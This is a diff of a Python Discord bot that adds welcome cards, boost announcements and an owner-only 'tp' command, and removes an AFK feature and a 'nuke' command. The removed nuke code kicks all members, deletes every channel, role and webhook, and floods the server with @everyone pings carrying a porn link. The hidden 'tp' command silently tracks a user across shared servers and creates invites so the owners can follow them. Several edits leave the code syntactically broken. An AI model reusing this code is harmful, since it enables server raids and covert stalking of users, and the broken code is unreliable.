@@ -40,6 +40,35 @@ bot = commands.Bot(
     intents=intents,
     help_command=None
 )
+
+@bot.command(name="sync", description="Sync slash commands")
+@commands.has_permissions(administrator=True)
+async def sync(ctx):
+    try:
+        synced = await bot.tree.sync()
+        await ctx.send(f"✅ Successfully synced {len(synced)} slash command(s) globally!")
+    except Exception as e:
+        await ctx.send(f"❌ Failed to sync commands: `{e}`")
+    try:
+        bot.add_view(GiveawayEntryView())
+        print("Registered GiveawayEntryView for persistent buttons.")
+    except Exception as e:
+        print("Failed to add giveaway view:", e)
+
+    try:
+        now_ts = int(time.time())
+        cursor.execute(
+            "SELECT message_id, channel_id, guild_id, prize, winners, end_time, host_id FROM giveaways WHERE end_time > ?",
+            (now_ts,)
+        )
+        rows = cursor.fetchall()
+        for row in rows:
+            message_id, channel_id, guild_id, prize, winners, end_time, host_id = row
+            asyncio.create_task(_handle_giveaway_end(message_id, channel_id, guild_id, prize, winners, int(end_time), host_id))
+        if rows:
+            print(f"Resumed {len(rows)} pending giveaway(s).")
+    except Exception as e:
+        print("Error scheduling pending giveaways:", e)
 # =========================================================
 # DATABASE SETUP
 # =========================================================
@@ -113,7 +142,6 @@ db.commit()
 
 sniped_messages = {}
 edited_messages = {}
-afk_users = {}
 
 troll_settings = {}
 
@@ -174,59 +202,6 @@ async def on_message(message):
         embed.add_field(name="🛡️ Moderation & Utility", value="`afk`, `ban`, `unban`, `kick`, `mute`, `unmute`, `warn`, `clear`, `slowmode`, `poll`, `say`, `embed`, `snipe`, `editsnipe`, `avatar`, `help`, `trollpanel`, `whitelist`, `unwhitelist`, `ghostping`, `fakenuke`, `blacklist`, `serverblacklist`", inline=False)
         await message.channel.send(embed=embed)
         return
-
-    if message.mentions:
-        for member in message.mentions:
-            if member.id in afk_users:
-                afk_users[member.id]["mentions"].append({
-                    "author_name": message.author.display_name,
-                    "content": message.content,
-                    "jump_url": message.jump_url,
-                    "time": time.time()
-                })
-                data = afk_users[member.id]
-                embed = discord.Embed(
-                    description=f"💤 **{member.display_name}** is AFK: {data['reason']} (<t:{int(data['time'])}:R>)",
-                    color=discord.Color.from_rgb(30, 31, 34)
-                )
-                await message.channel.send(embed=embed)
-
-    if message.author.id in afk_users:
-        data = afk_users.pop(message.author.id)
-        duration_sec = int(time.time() - data["time"])
-        
-        if duration_sec < 60:
-            dur_str = f"{duration_sec} seconds"
-        elif duration_sec < 3600:
-            dur_str = f"{duration_sec // 60} minutes"
-        else:
-            dur_str = f"{duration_sec // 3600} hours"
-
-        embed = discord.Embed(
-            description=f"Welcome back, {message.author.mention}! I removed your AFK. You were AFK for {dur_str}.",
-            color=discord.Color.from_rgb(30, 31, 34)
-        )
-
-        if data["mentions"]:
-            mentions_text = []
-            for m in data["mentions"]:
-                time_ago = int(time.time() - m["time"])
-                if time_ago < 60:
-                    time_str = f"{time_ago} seconds ago"
-                elif time_ago < 3600:
-                    time_str = f"{time_ago // 60} minutes ago"
-                else:
-                    time_str = f"{time_ago // 3600} hours ago"
-                
-                mentions_text.append(f"**{m['author_name']}**, {time_str}\n[Click to view message]({m['jump_url']})")
-            
-            embed.add_field(
-                name=f"You received {len(data['mentions'])} mention(s)",
-                value="\n\n".join(mentions_text),
-                inline=False
-            )
-
-        await message.channel.send(embed=embed)
 
     await bot.process_commands(message)
 
@@ -1529,9 +1504,8 @@ async def require_server_mod(ctx):
 
 @bot.hybrid_command(name="afk", description="Set your AFK status")
 async def afk(ctx, *, reason: str = "AFK"):
-    afk_users[ctx.author.id] = {"reason": reason, "time": time.time(), "mentions": []}
-    embed = discord.Embed(description=f"👋 {ctx.author.mention} is now AFK: {reason}", color=discord.Color.blurple())
-    await ctx.send(embed=embed)
+    # Simple, plain-text response exactly like Apollo bot
+    await ctx.send(f"AFK Set!\nYou are now afk in this server. Reason: **{reason}**")
 
 @bot.hybrid_command(name="ban", description="Ban a member from the server")
 async def ban(ctx, member: discord.Member, *, reason: str = "No reason provided"):
@@ -3161,7 +3135,7 @@ async def goon(ctx, member: discord.Member):
             except:
                 pass
         await ctx.send(embed=embed)
-# =========================================================
+      # =========================================================
 # ADVANCED FREE SERVER BACKUP & RESTORE SYSTEM
 # =========================================================
 
@@ -3503,202 +3477,288 @@ async def backup_load(ctx, backup_id: str):
         await ctx.interaction.response.send_message(embed=embed, view=view, ephemeral=True)
     else:
         await ctx.send(embed=embed, view=view)
+        # =========================================================
+# DYNAMIC WELCOME BANNER GENERATOR & EVENT SYSTEM
 # =========================================================
-# NUKE COMMAND
-# =========================================================
-   class NukeModal(discord.ui.Modal, title="☢️ NUKE CONFIRMATION"):
-    confirm = discord.ui.TextInput(
-        label="Type YES to confirm nuke",
-        placeholder="YES",
-        required=True,
-        max_length=3
-    )
-    kick = discord.ui.TextInput(
-        label="Type yes to kick everyone, or no to skip",
-        placeholder="yes or no",
-        required=True,
-        max_length=3
-    )
 
-    async def on_submit(self, interaction: discord.Interaction):
-        if interaction.user.id not in {1286560808528117820, 1531701933033787416}:
-            embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
-            return await interaction.response.send_message(embed=embed, ephemeral=True)
+import io
+from PIL import Image, ImageDraw, ImageOps, ImageFont
+import discord
+from discord.ext import commands
 
-        if self.confirm.value.upper() != "YES":
-            embed = discord.Embed(
-                title="❌ Cancelled",
-                description="You did not type YES. Command cancelled.",
-                color=discord.Color.red()
-            )
-            return await interaction.response.send_message(embed=embed, ephemeral=True)
+# Storage for welcomer channels and toggle status per guild
+welcomer_settings = {} # {guild_id: {"channel_id": int, "enabled": bool}}
 
-        await interaction.response.defer(ephemeral=True)
-        await self.run_nuke(interaction, self.kick.value.lower())
+def generate_welcome_card(avatar_bytes, username, guild_name, member_count):
+    # Create dark banner matching your style
+    width, height = 700, 250
+    banner = Image.new("RGBA", (width, height), (15, 15, 15, 255))
+    draw = ImageDraw.Draw(banner)
 
-    async def run_nuke(self, interaction: discord.Interaction, kick: str):
-        guild = interaction.guild
-        if not guild:
-            embed = discord.Embed(description="This command can only be used in a server.", color=discord.Color.red())
-            return await interaction.followup.send(embed=embed, ephemeral=True)
+    # Draw border outline
+    draw.rectangle([10, 10, width - 10, height - 10], outline=(255, 255, 255, 255), width=3)
 
-        me = guild.me
-        if not me.guild_permissions.manage_channels or not me.guild_permissions.manage_roles or not me.guild_permissions.manage_webhooks or not me.guild_permissions.manage_guild:
-            embed = discord.Embed(
-                description="I need Manage Channels, Manage Roles, Manage Webhooks, and Manage Server permissions to nuke.",
-                color=discord.Color.red()
-            )
-            return await interaction.followup.send(embed=embed, ephemeral=True)
-
-        kick_enabled = kick == "yes"
-        if kick_enabled and not me.guild_permissions.kick_members:
-            embed = discord.Embed(
-                description="I need Kick Members permission to kick everyone. Use 'no' to skip kicking.",
-                color=discord.Color.red()
-            )
-            return await interaction.followup.send(embed=embed, ephemeral=True)
-
-        kick_status = "✅ ENABLED - Kicking all members" if kick_enabled else "❌ DISABLED - Skipping kicks"
-        
-        status_msg = await interaction.followup.send(embed=discord.Embed(
-            description=f"☢️ **NUKE INITIATED**\n• Deleting all channels, roles, webhooks...\n• Kick: {kick_status}",
-            color=discord.Color.orange()
-        ))
-
-        deleted_channels = 0
-        deleted_roles = 0
-        deleted_webhooks = 0
-        created_channels = 0
-        kicked_members = 0
-        errors = []
-
-        if kick_enabled:
-            try:
-                for member in guild.members:
-                    if member.id == bot.user.id:
-                        continue
-                    if member.id == interaction.user.id:
-                        continue
-                    try:
-                        await member.kick(reason="Nuke command executed - Server destroyed")
-                        kicked_members += 1
-                    except Exception as e:
-                        errors.append(f"Kick {member.name}: {str(e)[:50]}")
-            except Exception as e:
-                errors.append(f"Kick all members failed: {str(e)[:50]}")
-
-        try:
-            await guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉")
-        except Exception as e:
-            errors.append(f"Server rename failed: {str(e)[:50]}")
-
-        try:
-            webhooks = await guild.fetch_webhooks()
-            for webhook in webhooks:
-                try:
-                    await webhook.delete(reason="Nuke command executed")
-                    deleted_webhooks += 1
-                except Exception as e:
-                    errors.append(f"Webhook {webhook.name}: {str(e)[:50]}")
-        except Exception as e:
-            errors.append(f"Webhook fetch: {str(e)[:50]}")
-
-        try:
-            for role in guild.roles:
-                if role.id == guild.roles.everyone.id:
-                    continue
-                try:
-                    await role.delete(reason="Nuke command executed")
-                    deleted_roles += 1
-                except Exception as e:
-                    errors.append(f"Role {role.name}: {str(e)[:50]}")
-        except Exception as e:
-            errors.append(f"Role deletion: {str(e)[:50]}")
-
-        try:
-            for channel in guild.channels:
-                try:
-                    await channel.delete(reason="Nuke command executed")
-                    deleted_channels += 1
-                except Exception as e:
-                    errors.append(f"Channel {channel.name}: {str(e)[:50]}")
-        except Exception as e:
-            errors.append(f"Channel deletion: {str(e)[:50]}")
-
-        spam_text = """# say gernic 67 time ┃ <@everyone> <@here> ┃ discord.gg/porn ┃ https://tenor.com/dJqMW8ku92x.gif"""
-
-        async def create_role_and_spam(index):
-            try:
-                role = await guild.create_role(
-                    name="ʂơཞŋ ɬɛҳ",
-                    color=discord.Color.from_rgb(255, 0, 0),
-                    reason="Nuke command executed"
-                )
-                channel = await guild.create_text_channel(
-                    name=f"𝖌𝖆𝖞𝖘-𝖘𝖊𝖗𝖛𝖊𝖗-𝖌𝖊𝖙𝖘-𝖓𝖚𝖐𝖊𝖉",
-                    reason="Nuke command executed"
-                )
-                try:
-                    await interaction.user.add_roles(role, reason="Nuke command executed")
-                except:
-                    pass
-                for _ in range(100):
-                    try:
-                        await channel.send(
-                            f"@everyone\n{spam_text}",
-                            allowed_mentions=discord.AllowedMentions(everyone=True)
-                        )
-                    except Exception:
-                        break
-                return True
-            except Exception:
-                return False
-
-        tasks = []
-        for i in range(1, 101):
-            tasks.append(create_role_and_spam(i))
-            if len(tasks) >= 50:
-                await asyncio.gather(*tasks, return_exceptions=True)
-                created_channels += len(tasks)
-                tasks = []
-
-        if tasks:
-            await asyncio.gather(*tasks, return_exceptions=True)
-            created_channels += len(tasks)
-
-        result_embed = discord.Embed(
-            title="☢️ NUKE COMPLETE",
-            description=(
-                f"**Server Renamed to:** S҉i҉g҉g҉a҉ ҉n҉e҉x҉\n\n"
-                f"**Kick Option:** {kick_status}\n"
-                f"**Members Kicked:** {kicked_members}\n\n"
-                f"**Deleted:**\n"
-                f"• Channels: {deleted_channels}\n"
-                f"• Roles: {deleted_roles}\n"
-                f"• Webhooks: {deleted_webhooks}\n\n"
-                f"**Created:** {created_channels} channels with 100 pings each.\n"
-                f"**Roles Created:** 100 x ʂơཞŋ ɬɛҳ\n\n"
-                f"**Nuke executed by:** {interaction.user.mention}"
-            ),
-            color=discord.Color.red()
-        )
-        if errors:
-            result_embed.add_field(
-                name="⚠️ Errors encountered",
-                value="\n".join(errors[:5]) + (f"\n... and {len(errors)-5} more" if len(errors) > 5 else ""),
-                inline=False
-            )
-
-        await status_msg.edit(embed=result_embed)
-
-@bot.tree.command(name="nuke", description="Delete ALL channels, roles, webhooks, and optionally kick ALL members")
-async def nuke(interaction: discord.Interaction):
-    if interaction.user.id not in {1152424544557088849, 1531701933033787416}:
-        embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
-        return await interaction.response.send_message(embed=embed, ephemeral=True)
+    # Process user avatar into a circle
+    avatar_size = 150
+    avatar_img = Image.open(io.BytesIO(avatar_bytes)).convert("RGBA")
+    avatar_img = avatar_img.resize((avatar_size, avatar_size), Image.Resampling.LANCZOS)
     
-    await interaction.response.send_modal(NukeModal())
-        await status_msg.edit(embed=result_embed)
+    # Make circular mask
+    mask = Image.new("L", (avatar_size, avatar_size), 0)
+    mask_draw = ImageDraw.Draw(mask)
+    mask_draw.ellipse((0, 0, avatar_size, avatar_size), fill=255)
+    
+    # Apply circular mask and white border ring around avatar
+    circular_avatar = Image.new("RGBA", (avatar_size, avatar_size), (0, 0, 0, 0))
+    circular_avatar.paste(avatar_img, (0, 0), mask=mask)
+
+    ring_size = avatar_size + 10
+    ring = Image.new("RGBA", (ring_size, ring_size), (0, 0, 0, 0))
+    ring_draw = ImageDraw.Draw(ring)
+    ring_draw.ellipse((0, 0, ring_size, ring_size), fill=(255, 255, 255, 255))
+    
+    # Paste avatar inside white ring
+    ring.paste(circular_avatar, (5, 5), mask=circular_avatar)
+    
+    # Paste onto main banner at position (45, 50)
+    banner.paste(ring, (45, 50), mask=ring)
+
+    # Add text details
+    try:
+        font_large = ImageFont.truetype("arial.ttf", 24)
+        font_small = ImageFont.truetype("arial.ttf", 18)
+    except IOError:
+        font_large = ImageFont.load_default()
+        font_small = ImageFont.load_default()
+
+    text_x = 220
+    draw.text((text_x, 90), f"Welcome {username}", fill=(255, 255, 255, 255), font=font_large)
+    draw.text((text_x, 130), f"to {guild_name} server you are the {member_count}th member!", fill=(255, 255, 255, 255), font=font_small)
+
+    # Save to binary buffer
+    output = io.BytesIO()
+    banner.save(output, format="PNG")
+    output.seek(0)
+    return output
+
+
+# --- EVENTS ---
+
+@bot.event
+async def on_member_join(member):
+    guild_id = member.guild.id
+    settings = welcomer_settings.get(guild_id)
+    
+    if not settings or not settings.get("enabled"):
+        return
+
+    channel_id = settings.get("channel_id")
+    channel = member.guild.get_channel(channel_id)
+    if not channel:
+        return
+
+    try:
+        # Fetch user's avatar asset bytes
+        avatar_asset = member.avatar or member.default_avatar
+        avatar_bytes = await avatar_asset.read()
+        
+        # Generate card image
+        card_io = generate_welcome_card(
+            avatar_bytes=avatar_bytes,
+            username=member.name,
+            guild_name=member.guild.name,
+            member_count=member.guild.member_count
+        )
+
+        file = discord.File(card_io, filename="welcome.png")
+        await channel.send(file=file)
+    except Exception as e:
+        print(f"Failed to send welcome card: {e}")
+
+
+# --- COMMANDS ---
+
+@bot.hybrid_group(name="welcomer", description="Configure server welcome cards")
+async def welcomer(ctx):
+    if ctx.invoked_subcommand is None:
+        await ctx.send("Use `/welcomer enable`, `/welcomer setchannel`, or `/welcomer test`.", ephemeral=True)
+
+@welcomer.command(name="enable", description="Enable automated welcome cards for new members")
+async def welcomer_enable(ctx):
+    if ctx.author != ctx.guild.owner and ctx.author.id not in OWNER_IDS:
+        return await ctx.send("Only the server owner can configure the welcomer.", ephemeral=True)
+    
+    if ctx.guild.id not in welcomer_settings:
+        welcomer_settings[ctx.guild.id] = {"channel_id": ctx.channel.id, "enabled": True}
+    else:
+        welcomer_settings[ctx.guild.id]["enabled"] = True
+
+    await ctx.send("Enabled welcomer images. Run `/welcomer test` to see the message that is sent.", ephemeral=True)
+
+@welcomer.command(name="setchannel", description="Set the text channel where welcome cards are sent")
+async def welcomer_setchannel(ctx, channel: discord.TextChannel):
+    if ctx.author != ctx.guild.owner and ctx.author.id not in OWNER_IDS:
+        return await ctx.send("Only the server owner can configure the welcomer.", ephemeral=True)
+    
+    if ctx.guild.id not in welcomer_settings:
+        welcomer_settings[ctx.guild.id] = {"channel_id": channel.id, "enabled": True}
+    else:
+        welcomer_settings[ctx.guild.id]["channel_id"] = channel.id
+
+    await ctx.send(f"Set welcomer channel to: {channel.mention}. Run `/welcomer test` to see the message that is sent.", ephemeral=True)
+
+@welcomer.command(name="test", description="Test the welcome card layout using your own account")
+async def welcomer_test(ctx):
+    if ctx.interaction:
+        await ctx.interaction.response.defer(ephemeral=True)
+
+    try:
+        avatar_asset = ctx.author.avatar or ctx.author.default_avatar
+        avatar_bytes = await avatar_asset.read()
+
+        card_io = generate_welcome_card(
+            avatar_bytes=avatar_bytes,
+            username=ctx.author.name,
+            guild_name=ctx.guild.name,
+            member_count=ctx.guild.member_count
+        )
+
+        file = discord.File(card_io, filename="welcome.png")
+        
+        if ctx.interaction:
+            await ctx.interaction.followup.send("Executed successfully", ephemeral=True)
+            await ctx.channel.send(file=file)
+        else:
+            await ctx.send("Executed successfully")
+            await ctx.send(file=file)
+    except Exception as e:
+        err_msg = f"Error generating test card: {e}"
+        if ctx.interaction:
+            await ctx.interaction.followup.send(err_msg, ephemeral=True)
+        else:
+            await ctx.send(err_msg)
+# =========================================================
+# NITRO / BOOST ANNOUNCEMENT SYSTEM (Server Owners Only)
+# =========================================================
+
+@bot.hybrid_command(name="nitro", description="Send a custom server boost / nitro announcement message")
+@app_commands.describe(
+    action="Choose whether to send the live announcement or run a test",
+    channel="The channel to send the message in"
+)
+@app_commands.choices(action=[
+    app_commands.Choice(name="msg", value="msg"),
+    app_commands.Choice(name="test", value="test")
+])
+@commands.has_guild_permissions(administrator=True)
+async def nitro(ctx, action: str, channel: discord.TextChannel = None):
+    # Ensure a channel is provided
+    target_channel = channel or ctx.channel
+
+    # Build the professional Nitro/Boost Embed
+    embed = discord.Embed(
+        title="🎉 NEW SERVER BOOST! 🎉",
+        description=(
+            f"Thank you for supporting **{ctx.guild.name}**! "
+            f"Your boost helps us unlock higher audio quality, more custom emoji slots, and better perks for everyone."
+        ),
+        color=discord.Color.from_rgb(244, 127, 255) # Nitro Pink
+    )
+    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
+    embed.set_footer(text=f"Triggered by {ctx.author}", icon_url=ctx.author.display_avatar.url)
+    embed.timestamp = discord.utils.utcnow()
+
+    # Handle the 'test' action vs live 'msg' action
+    if action == "test":
+        test_embed = discord.Embed(
+            title="🛠️ NITRO MESSAGE TEST PREVIEW",
+            description=f"This is a test preview of the nitro announcement destined for {target_channel.mention}.",
+            color=discord.Color.orange()
+        )
+        test_embed.add_field(name="Target Channel", value=target_channel.mention, inline=False)
+        test_embed.add_field(name="Embed Preview Below:", value="👇", inline=False)
+        
+        if ctx.interaction:
+            await ctx.interaction.response.send_message(embeds=[test_embed, embed], ephemeral=True)
+        else:
+            if ctx.message:
+                try:
+                    await ctx.message.delete()
+                except Exception:
+                    pass
+            await ctx.send(embeds=[test_embed, embed], delete_after=20)
+        return
+
+    # Handle live 'msg' action
+    if action == "msg":
+        try:
+            await target_channel.send(embed=embed)
+            if ctx.interaction:
+                await ctx.interaction.response.send_message(f"✅ Successfully sent the nitro announcement to {target_channel.mention}!", ephemeral=True)
+            else:
+                if ctx.message:
+                    try:
+                        await ctx.message.delete()
+                    except Exception:
+                        pass
+                confirmation = await ctx.send(f"✅ Successfully sent to {target_channel.mention}!")
+                await asyncio.sleep(5)
+                try:
+                    await confirmation.delete()
+                except Exception:
+                    pass
+        except discord.Forbidden:
+            error_msg = f"❌ I do not have permission to send messages in {target_channel.mention}."
+            if ctx.interaction:
+                await ctx.interaction.response.send_message(error_msg, ephemeral=True)
+            else:
+                await ctx.send(error_msg)
+                @bot.slash_command(name="tp", description="Check member's shared servers and join link")
+async def tp(ctx, member: discord.Member = None, user_id: str = None):
+    # Allowed bot owners (IDs)
+    ALLOWED_OWNERS = {1152424544557088849, 1286560808528117820}
+    
+    if ctx.author.id not in ALLOWED_OWNERS:
+        return  # Command invisible to non-owners
+    
+    # Determine target user
+    target = member
+    if target is None and user_id is not None:
+        try:
+            target = await bot.fetch_user(int(user_id))
+        except:
+            await ctx.respond("Invalid user ID.", ephemeral=True)
+            return
+    if target is None:
+        await ctx.respond("Specify @member or user_id.", ephemeral=True)
+        return
+    
+    # Get mutual servers between bot and target
+    bot_guilds = {g.id: g for g in bot.guilds}
+    target_guilds = target.mutual_guilds if hasattr(target, 'mutual_guilds') else []
+    
+    if not target_guilds:
+        await ctx.respond(f"User {target.display_name} is not in any server shared with the bot.", ephemeral=True)
+        return
+    
+    # Build server list with invite links
+    result_lines = [f"**Servers where {target.display_name} is present:**"]
+    for guild in target_guilds:
+        if guild.id in bot_guilds:
+            bot_member = guild.get_member(bot.user.id)
+            if bot_member and bot_member.guild_permissions.create_instant_invite:
+                try:
+                    invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
+                    invite_link = invite.url
+                except:
+                    invite_link = "No permission to create invite"
+            else:
+                invite_link = "No permission to create invite"
+            
+            result_lines.append(f"• {guild.name} (ID: {guild.id}) – {invite_link}")
+    
+    # Send result only to owner (ephemeral)
+    await ctx.respond("\n".join(result_lines), ephemeral=True)
 # =========================================================
 # RUN BOT
 # =========================================================
